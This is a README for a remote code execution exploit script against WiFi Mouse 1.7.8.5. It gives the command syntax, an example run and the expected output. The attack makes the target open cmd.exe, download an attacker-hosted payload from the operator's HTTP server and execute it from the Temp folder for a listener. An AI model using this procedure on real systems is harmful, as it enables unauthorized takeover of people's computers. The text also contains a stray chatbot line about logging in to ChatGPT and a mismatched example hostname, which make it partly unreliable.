# WiFi Mouse 1.7.8.5 Remote Code Execution Exploit (Remake)

This script is an exploit for **WiFi Mouse 1.7.8.5** that allows an attacker to execute arbitrary commands on the target system remotely. The exploit works by exploiting a vulnerability in the desktop server software used by the mobile app, which doesn't properly validate input commands.

## Description

The **WiFi Mouse** app (version 1.7.8.5) allows users to control their PC via a mobile device. However, the desktop server software does not fully protect against unauthorized remote command execution. This vulnerability allows an attacker to send crafted packets to the target system, which results in remote code execution.

This script exploits this vulnerability to execute arbitrary commands and download a payload from a remote server.

## Exploit Details

The vulnerability exists in the PIN verification process, which fails to prevent unauthorized command execution. The target responds with a `needpassword` message, which is only handled by the mobile app and does not block the execution of commands.

## Requirements

- **Python 3.x** (Tested on Python 3.7+)
- **target IP or domain**
- **Local HTTP server running with the payload**

## Usage

### Prerequisites:

1. **Install Python 3.x** if not already installed.
2. **Run a local HTTP server** to host your payload.
3. **Prepare your payload** that will be executed on the target machine.

### Running the Script:

```bash
python exploit_script.py <target-ip/domain> <local-http-server-ip> <payload-name>

```

**Parameters**:

- `<target-ip/domain>`: The IP address or domain of the target machine.
- `<local-http-server-ip>`: Your local machine's IP address, where the payload is hosted.
- `<payload-name>`: The name of the payload file to be executed on the target.

### Example:

```bash
python exploit_script.py hermes.local.exam 192.168.1.100 payload.exe

```

This command will:

- Resolve the domain `hermes.local` to its corresponding IP.
- Connect to the target on port `1978`.
- Download the payload (`payload.exe`) from your local HTTP server at `192.168.1.100`.

### Script Output:

Once the script is executed, it will:

- Open the `cmd.exe` on the target system.
- Deliver the payload.
- Execute the payload from the `C:\Windows\Temp\` directory.

### Expected Output:

```bash
Resolving Target IP for hermes.local...
Resolved Target IP: 192.168.1.10, Port: 1978
[+] Connecting to target...
[+] Starting exploit in 3...2...1...
[+] Opening cmd.exe...
[+] Delivering payload to target...
[+] Executing payload from Temp folder...
[+] Exploit complete! Check your listener.
[+] Connection closed.

```

## References

- [Exploit-DB: 49601](https://www.exploit-db.com/exploits/49601)

## Disclaimer

This script is intended for educational purposes and to demonstrate the vulnerability in the WiFi Mouse software. Use it responsibly and only on systems where you have explicit permission to perform penetration testing.

---

Once you log in to ChatGPT, I can help you generate and manage this content more efficiently, including converting it into a proper `README.md` file for you.